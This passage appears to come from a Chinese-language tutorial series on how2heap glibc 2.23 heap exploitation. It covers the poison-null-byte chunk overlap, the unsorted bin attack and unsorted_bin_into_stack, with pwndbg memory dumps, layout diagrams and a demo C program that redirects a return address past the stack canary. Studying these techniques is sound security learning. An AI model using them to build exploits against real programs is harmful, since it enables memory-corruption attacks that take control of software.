src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-70.png#clientId=u347f053a-7aac-4&from=paste&height=147&id=t6067&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=542&originalType=binary&size=192046&status=done&style=none&taskId=ue48f1fd2-2a78-47b3-bc68-82d30fc82ee&width=271" alt="image.png"><br>为了在修改 chunk b 的 size 字段后，依然能通过 unlink 的检查，我们需要伪造一个 c.prev_size 字段，字段的大小是很好计算的，即</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">(<span class="hljs-number">0x211</span> &amp; <span class="hljs-number">0xff00</span>) == <span class="hljs-number">0x200</span><br></code></pre></td></tr></table></figure><p>然而此时 c.presize = 0x210 但是没关系我们还是能逃过掉前面那个检查，根据</p><ul><li>chunksize(P) == _((size_t_)(b-0x8)) == 0x200</li></ul><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-71.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=udb9d75df&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=349&originalType=binary&size=15531&status=done&style=none&taskId=u872d4aa7-ddf6-44cb-88ed-dcefeb1f8c9&width=174.5" alt="image.png"></p><ul><li>prev_size (next_chunk(P)) == _(size_t_)(b-0x10 + 0x200) == 0x200</li></ul><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-72.png#clientId=u347f053a-7aac-4&from=paste&height=26&id=u62a4d804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=51&originWidth=464&originalType=binary&size=20487&status=done&style=none&taskId=u592a1b66-9865-4f94-aa68-12c1ad333e3&width=232" alt="image.png"><br>可以成功绕过检查。另外 unsorted bin 中的 chunk 大小也变成了 0x200<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-73.png#clientId=u347f053a-7aac-4&from=paste&height=299&id=u041b16b4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=1095&originalType=binary&size=563900&status=done&style=none&taskId=u067af4f7-7887-4809-bbff-9fde5b59098&width=547.5" alt="image.png"><br>此时 c 附近的内存布局为：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-74.png#clientId=u38185df4-f4d6-4&from=paste&height=89&id=ubab11d5a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=630&originalType=binary&size=133263&status=done&style=none&taskId=u00b8c7ae-fce5-42f9-af3e-3ee466a238b&width=315" alt="image.png"><br>然后 malloc 一个大小 0x100 的<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-75.png#clientId=u347f053a-7aac-4&from=paste&height=246&id=u5287ab82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=717&originalType=binary&size=211710&status=done&style=none&taskId=u47f0c58b-bc17-41e6-8618-b79ccd5522f&width=358.5" alt="image.png"><br>返回给 b1 的地址就是前面 free 掉的 b 的地址。<br>这个时候 chunk c 的 prev_size 本应该变为 0xf0（0x200-0x110)。<br>注意分配堆块后，发生变化的是 fake c.prev_size，而不是 c.prev_size。现在 C 的 presize 在原来地址的前 0x10 bytes 处（2 个单元）更新。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">10</span>gx c<span class="hljs-number">-0x20</span><br><span class="hljs-number">0x8008310</span>:      <span class="hljs-number">0x00000000000000f0</span>      <span class="hljs-number">0x0000000000000000</span>   &lt;-fake chunk<br><span class="hljs-number">0x8008320</span>:      <span class="hljs-number">0x0000000000000210</span>      <span class="hljs-number">0x0000000000000110</span>   &lt;-chunk c<br><span class="hljs-number">0x8008330</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8008340</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8008350</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 free chunk。但其实这片内存已经被分配给了 chunk b1。<br>再 b2 = malloc(0x80);<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-76.png#clientId=u347f053a-7aac-4&from=paste&height=325&id=u67d2c401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=765&originalType=binary&size=432623&status=done&style=none&taskId=uad2f58c3-1b4a-4bc6-bceb-b69c2430848&width=382.5" alt="image.png"><br>查看 b2 内容<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-77.png#clientId=u347f053a-7aac-4&from=paste&height=43&id=u9891ba02&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=1408&originalType=binary&size=66799&status=done&style=none&taskId=u4abc7e76-7fc1-430b-b003-67a1ca162ab&width=704" alt="image.png"><br>之后我们将 b1 和 c 依次 free。这会导致 b1 开始的位置一直到 c 的末尾中间的内存会合并成一块。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-78.png#clientId=u347f053a-7aac-4&from=paste&height=245&id=ue1b01bcc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=489&originWidth=690&originalType=binary&size=307368&status=done&style=none&taskId=u66134a2a-6185-42df-8286-348ccc688e4&width=345" alt="image.png"><br>为什么会发生合并？<br>在我们第一次 free(b)之前，进行了如下的设置：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br></code></pre></td></tr></table></figure><p>这一步确保了我们之后进行 null byte 溢出后，还能成功 free(b)，逃过** ‘chunksize(P) != prev_size (next_chunk(P))’** 的检查。<br>之后分配 b1 和 b2 的时候，presize 也会一直在(b+0x1f0)处更新。<br>而在最后 free(c)的时候，检查的是 c 的 presize 位，而因为最开始的 null byte 溢出，导致这块区域的值一直没被更新，一直是 b 最开始的大小 0x210 。<br>我们知道，两个相邻的 small chunk 被释放后会被合并在一起。首先释放 chunk b1，伪造出 fake chunk b 是 free chunk 的样子。然后释放 chunk c，因为 chunk c 的 prevsize 没有变化，这个时候 chunk c 会认为 chunk b1 就是 chunk b，这时程序会发现 chunk c 的前一个 chunk 是一个 free chunk，然后就将它们合并在了一起，并从 unsorted bin 中取出来合并进了 top chunk。 chunk b2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块区域都是未分配的。</p><blockquote><p>补充：</p></blockquote><p>chunk 合并的过程如下，首先该 chunk 与前一个 chunk 合并，然后检查下一个 chunk 是否为 top chunk，如果不是，将合并后的 chunk 放回 unsorted bin 中，否则，合并进 top chunk：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-comment">/* consolidate backward */</span><br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>    prevsize = p-&gt;prev_size;<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>    unlink(av, p, bck, fwd);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">not placed into regular bins until after they have</span><br><span class="hljs-comment">been given one chance to be used in malloc.</span><br><span class="hljs-comment">  */</span><br>    [...]<br>  &#125;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">    consolidate into top</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    check_chunk(av, p);<br>  &#125;<br></code></pre></td></tr></table></figure><p>d = malloc(0x300);之后<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-79.png#clientId=u347f053a-7aac-4&from=paste&height=292&id=u8ac32d1f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=584&originWidth=856&originalType=binary&size=322110&status=done&style=none&taskId=u180d0ab4-b269-41a1-82ba-b7916de8294&width=428" alt="image.png"><br>返回的地址还是原来 b 的地址（0x8008120-0x10)，刚才没有 free 的 b2 也被包含在了里面<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-80.png#clientId=u347f053a-7aac-4&from=paste&height=221&id=u0df4b579&margin=%5Bobject%20Object%5D&name=image.png&originHeight=441&originWidth=728&originalType=binary&size=273747&status=done&style=none&taskId=ue4446f69-2c7e-4ee8-84e6-a39289eafa7&width=364" alt="image.png"><br>查看 b2 内容<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-81.png#clientId=u347f053a-7aac-4&from=paste&height=402&id=u2001de99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1817&originalType=binary&size=1146578&status=done&style=none&taskId=u0b17fedc-0d1f-4bbb-84a2-a65830e45a9&width=908.5" alt="image.png"><br>该技术适用的场景需要某个 malloc 的内存区域存在一个单字节溢出漏洞。通过溢出下一个 chunk 的 size 字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。<br>对于单字节溢出的利用有下面几种：</p><ul><li>扩展被释放块：当溢出块的下一块为被释放块且处于 unsorted bin 中，则通过溢出一个字节来将其大小扩大，下次取得次块时就意味着其后的块将被覆盖而造成进一步的溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>   <span class="hljs-number">0x100</span>    <span class="hljs-number">0x80</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   初始状态<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   释放 B<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x180</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|-------|-------|   C 块被覆盖<br>        |&lt;--实际得到的块-&gt;|<br></code></pre></td></tr></table></figure><ul><li>扩展已分配块：当溢出块的下一块为使用中的块，则需要合理控制溢出的字节，使其被释放时的合并操作能够顺利进行，例如直接加上下一块的大小使其完全被覆盖。下一次分配对应大小时，即可取得已经被扩大的块，并造成进一步溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>   <span class="hljs-number">0x100</span>    <span class="hljs-number">0x80</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   初始状态<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x180</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   释放 B<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|-------|-------|   C 块被覆盖<br>        |&lt;--实际得到的块-&gt;|<br></code></pre></td></tr></table></figure><ul><li>收缩被释放块(即本题)：此情况针对溢出的字节只能为 0 的时候，也就是本节所说的 poison-null-byte，此时将下一个被释放的块大小缩小，如此一来在之后分裂此块时将无法正确更新后一块的 prev_size 字段，导致释放时出现重叠的堆块。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>     <span class="hljs-number">0x210</span>     <span class="hljs-number">0x80</span><br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   初始状态<br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   释放 B<br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x200</span><br>|-------|---------------|-------|   之后的 <span class="hljs-built_in">malloc</span> 操作没有更新 C 的 prev_size<br>         <span class="hljs-number">0x100</span>  <span class="hljs-number">0x80</span><br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>)<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   释放 B1<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   释放 C，C 将与 B1 合并<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|------|-----|--|-------|   B2 将被覆盖<br>        |&lt;实际得到的块&gt;|<br></code></pre></td></tr></table></figure><h1 id="unsorted-bin-attack-2-23"><a href="#unsorted-bin-attack-2-23" class="headerlink" title="unsorted_bin_attack-2.23"></a>unsorted_bin_attack-2.23</h1><p>这个例程通过 unsortedbin 攻击往栈中写入一个 unsigned long 的值。<br>在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。<br>比如，我们在栈上有一个栈单元 stack_var 需要被改写<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-82.png#clientId=u347f053a-7aac-4&from=paste&height=363&id=u7d59295c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=725&originWidth=1261&originalType=binary&size=1096913&status=done&style=none&taskId=u89bded64-5af6-47f4-924f-79af335cdee&width=630.5" alt="image.png"><br>然后正常地分配一个 chunk。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-83.png#clientId=u347f053a-7aac-4&from=paste&height=382&id=u2ffbb479&margin=%5Bobject%20Object%5D&name=image.png&originHeight=763&originWidth=1317&originalType=binary&size=1001146&status=done&style=none&taskId=u9f9e017f-e53d-45c3-8392-e81c850ad3d&width=658.5" alt="image.png"><br>再分配一个，防止前一个 chunk 在 free 的时候被合并了。<br>然后 free(p);之后 p 会被插入到 unsortedbin 链表中，它的 fd 和 bk 都指向 unsortedbin 的 head。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-84.png#clientId=u347f053a-7aac-4&from=paste&height=411&id=ue0445c3d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=821&originWidth=1273&originalType=binary&size=926264&status=done&style=none&taskId=u78523055-0f89-49a0-b52c-064720e5b68&width=636.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-85.png#clientId=u347f053a-7aac-4&from=paste&height=203&id=u2f7a2bd4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=405&originWidth=700&originalType=binary&size=169863&status=done&style=none&taskId=ub7295ae7-dad7-4660-93cc-0a102a030ea&width=350" alt="image.png"><br>接着我们模拟一个漏洞攻击改写 p 的 bk 指针：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-86.png#clientId=u347f053a-7aac-4&from=paste&height=311&id=u9296eb09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=622&originWidth=1428&originalType=binary&size=739966&status=done&style=none&taskId=udf20161b-ffa2-4891-a78c-e634bd5c40b&width=714" alt="image.png"><br>然后 malloc<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-87.png#clientId=u347f053a-7aac-4&from=paste&height=424&id=ua20c418c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=848&originWidth=1326&originalType=binary&size=997797&status=done&style=none&taskId=u32fd2ae3-917b-48d2-b75f-4af6bd9b269&width=663" alt="image.png"><br>然后<strong>stack_var</strong>的值就被改写成了 unsortedbin 的 head 的地址了。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-88.png#clientId=u347f053a-7aac-4&from=paste&height=31&id=uf7fabbe9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=61&originWidth=461&originalType=binary&size=19308&status=done&style=none&taskId=uff3920b9-bf5d-41e3-acc8-d4bdc28317d&width=230.5" alt="image.png"><br>之前的 unsafe_unlink 是通过 unlink 来直接控制地址，这里则是通过 unlink 来泄漏 libc 的信息，来进行进一步的攻击。<br>可以参考这一篇：<a href="https://zoepla.github.io/2018/05/how2heap%E7%B3%BB%E5%88%97(%E5%9F%BA%E7%A1%80%E7%AF%87)/">Pwn 的挖坑填坑之旅</a><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-89.png#clientId=u347f053a-7aac-4&from=paste&height=114&id=ufc44a364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=227&originWidth=1230&originalType=binary&size=36359&status=done&style=none&taskId=u3dba95ad-3e7f-4983-9930-9ec41b88f5d&width=615" alt="image.png"></p><h1 id="unsorted-bin-into-stack-2-23"><a href="#unsorted-bin-into-stack-2-23" class="headerlink" title="unsorted_bin_into_stack-2.23"></a>unsorted_bin_into_stack-2.23</h1><p>例子源码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>        <span class="hljs-keyword">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br>        <span class="hljs-keyword">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>        <span class="hljs-built_in">free</span>(victim);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br>        stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>        stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer;<br><br>        <span class="hljs-comment">//------------VULNERABILITY-----------</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*S</span><br><span class="hljs-string">IZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br>        victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>        victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br>        <span class="hljs-comment">//------------------------------------</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><br>        <span class="hljs-keyword">intptr_t</span> sc = (<span class="hljs-keyword">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>        <span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), ≻, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>        assert((<span class="hljs-keyword">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-keyword">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>本题 unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。<br>初始栈<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-90.png#clientId=u38185df4-f4d6-4&from=paste&height=169&id=u10f80e0e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=244&originWidth=857&originalType=binary&size=239052&status=done&style=none&taskId=u384c129f-04ad-4a88-b95e-d38c2445330&width=593.5" alt="image.png"><br>先 malloc 一个 victim 块<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-91.png#clientId=u38185df4-f4d6-4&from=paste&height=168&id=u4ef9ac2b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=561&originalType=binary&size=171711&status=done&style=none&taskId=ucc095613-3559-47fc-acbe-4799fd59cbb&width=280.5" alt="image.png"><br>再分配一个防止 free 的时候和 top chunk 合并。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-92.png#clientId=u38185df4-f4d6-4&from=paste&height=219&id=u593caa2a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=437&originWidth=739&originalType=binary&size=274303&status=done&style=none&taskId=u3d672eb4-d629-46c2-818c-6ed05935421&width=369.5" alt="image.png"><br>接下来释放 p<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-93.png#clientId=u38185df4-f4d6-4&from=paste&height=246&id=u8713a8b8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=630&originalType=binary&size=283418&status=done&style=none&taskId=ufc8a4875-9011-4a1b-90f7-f38cfbfc398&width=315" alt="image.png"><br>可以看到它插入了 unsorted bin 列表中<br>我们要在栈上构造一个 chunk，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer;<br></code></pre></td></tr></table></figure><p>查看此时内存布局</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000111</span> &lt;-- victim chunk<br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007fffff3f3b78</span><br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><br>pwndbg&gt; x/<span class="hljs-number">4</span>gx stack_buffer<br><span class="hljs-number">0x7ffffffed9a0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000110</span>  &lt;-- fake chunk<br><span class="hljs-number">0x7ffffffed9b0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9a0</span><br></code></pre></td></tr></table></figure><p>然后假设有一个漏洞，可以改写 victim chunk 的 bk 指针，那么将其改为指向 fake chunk：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br></code></pre></td></tr></table></figure><p>这里的 size = 32，只要是一个合理的范围，比之后要申请的 chunk size 要小就行。然后我们把 victim-&gt;bk 的值赋为 stack_buffer</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000020</span>   &lt;-- victim chunk<br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007ffffffed9a0</span>   &lt;-- bk pointer<br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-94.png#clientId=u38185df4-f4d6-4&from=paste&height=321&id=uc4f1b5a0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=1051&originalType=binary&size=657454&status=done&style=none&taskId=u3fca205b-d8a5-417e-96c2-cd41a462aa2&width=525.5" alt="image.png"><br>过程如下：<br>​</p><p>首先 victim chunk 被从 unsorted bin 中取出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 